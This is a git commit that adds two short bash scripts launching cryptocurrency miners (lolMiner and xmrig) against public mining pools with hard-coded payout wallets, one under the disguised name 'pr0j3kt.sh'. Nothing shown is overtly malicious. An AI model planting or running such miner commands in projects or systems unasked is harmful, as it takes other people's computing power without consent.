1925c5a112e68a6cdc2e938677d0814da4a1f348
w1982898 <86400403+w1982898@users.noreply.github.com>
2021-06-24 07:48:04 +0000

    Add files via upload

---
+++ 7o7m1n3r.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+./lolMiner --coin AION --pool stratum.aionmine.org:9999 --user 0xa04023e012a35dc4911a5b77bd94ee49b3d2af1506a6553658fde8f7931c516f.fadedaion --pass minpay=10
---
+++ pr0j3kt.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xfd577b4a59986cb40d265150aff580da3d73209d.fadedshiba -p x
